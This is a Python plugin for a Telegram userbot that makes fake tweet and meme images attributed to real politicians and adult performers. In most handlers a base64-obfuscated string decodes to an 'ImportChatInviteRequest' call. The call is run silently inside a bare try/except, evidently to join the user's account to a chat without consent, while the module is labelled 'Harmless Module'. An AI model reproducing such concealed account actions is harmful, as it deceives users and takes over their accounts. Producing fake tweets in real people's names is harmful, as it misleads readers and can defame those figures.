from ROYALBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
from userbot.cmdhelp import CmdHelp
from userbot.helpers.funct import deEmojify
from userbot.helpers.tweets import (
    changemymind,
    dani,
    kannagen,
    miatweet,
    moditweet,
    papputweet,
    sinstweet,
    sunnytweet,
    taklatweet,
    trumptweet,
)


@bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
async def nope(royal):
    ROYAL = royal.pattern_match.group(1)
    if not ROYAL:
        if royal.is_reply:
            (await royal.get_reply_message()).message
        else:
            await edit_or_reply(royal, "I need some text to make a tweet🚶")
            return
    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(ROYAL))}")
    await tweeter[0].click(
        royal.chat_id,
        reply_to=royal.reply_to_msg_id,
        silent=True if royal.is_reply else False,
        hide_via=True,
    )
    await royal.delete()


@bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send you text to trump so he can tweet.")
                return
        else:
            await edit_or_reply(borg, "send you text to trump so he can tweet.")
            return
    await edit_or_reply(borg, "Requesting trump to tweet...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await trumptweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"modi(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send you text to modi so he can tweet.")
                return
        else:
            await edit_or_reply(borg, "send you text to modi so he can tweet.")
            return
    await edit_or_reply(borg, "Requesting modi to tweet...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await moditweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"mia(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send you text to Mia so she can tweet.")
                return
        else:
            await edit_or_reply(borg, "Send you text to Mia so she can tweet.")
            return
    await edit_or_reply(borg, "Requesting Mia to tweet...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await miatweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"dani(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send you text to Dani so she can tweet.")
                return
        else:
            await edit_or_reply(borg, "Send you text to Dani so she can tweet.")
            return
    await edit_or_reply(borg, "Requesting Dani to tweet...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await dani(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send a text to Pappu so he can tweet.")
                return
        else:
            await edit_or_reply(borg, "send your text to pappu so he can tweet.")
            return
    await edit_or_reply(borg, "Requesting pappu to tweet...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await papputweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"sunny(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send a text to Sunny so she can tweet.")
                return
        else:
            await edit_or_reply(borg, "send your text to sunny so she can tweet.")
            return
    await edit_or_reply(borg, "Requesting sunny to tweet...🥰")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await sunnytweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.johhny(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"johhny(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send a text to Johhny so he can tweet.")
                return
        else:
            await edit_or_reply(borg, "send your text to Johhny so he can tweet.")
            return
    await edit_or_reply(borg, "Requesting johhny to tweet...😆")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await sinstweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


@bot.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Send you text to baapu so he can tweet.")
                return
        else:
            await edit_or_reply(borg, "send you text to baapu so he can tweet.")
            return
    await edit_or_reply(borg, "Requesting baapu to tweet...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await taklatweet(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()  # bancho kitni baar bolu no offence


# @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "Give text for to write on banner, man")
                return
        else:
            await edit_or_reply(borg, "Give text for to write on banner, man")
            return
    await edit_or_reply(borg, "Your banner is under creation wait a sec...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await changemymind(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


# @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
@bot.on(admin_cmd(pattern=r"kanna(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
async def nekobot(borg):
    text = borg.pattern_match.group(1)
    reply_to_id = borg.message
    if borg.reply_to_msg_id:
        reply_to_id = await borg.get_reply_message()
    if not text:
        if borg.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(borg, "what should kanna write give text ")
                return
        else:
            await edit_or_reply(borg, "what should kanna write give text")
            return
    await edit_or_reply(borg, "Kanna is writing your text...")
    try:
        ROYAL = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await borg.client(ROYAL)
    except:
        pass
    text = deEmojify(text)
    borgfile = await kannagen(text)
    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
    await borg.delete()


CmdHelp("tweet").add_command(
    "kanna", "<text>/<reply to text>", "Kanna writes for you"
).add_command("cmm", "<text>/<reply>", "Get a banner of Change My Mind").add_command(
    "johhny", "<text>/<reply>", "Tweet with Johhny Sins"
).add_command(
    "sunny", "<text>/<reply>", "Tweet with Sunny Leone"
).add_command(
    "gandhi", "<text>/<reply>", "Tweet with Mahatma Gandhi"
).add_command(
    "pappu", "<text>/<reply>", "Tweet with pappu A.K.A Rahul Gandhi"
).add_command(
    "mia", "<text>/<reply>", "Tweet with Mia Khalifa 😍"
).add_command(
    "trump", "<text>/<reply>", "Tweet with Mr. DooLand Trump"
).add_command(
    "modi", "<text>/<reply>", "Tweet with Sir Narendra Modi"
).add_command(
    "tweet", "<text>/<reply>", "Tweets in your name"
).add_command(
    "dani", "<text>/<reply>", "Tweet with Dani Daniels 😍🥰"
).add_warning(
    "Harmless Module✅"
).add_info(
    "Its Make Fake Tweet Image"
).add_type(
    "Addons"
).add()
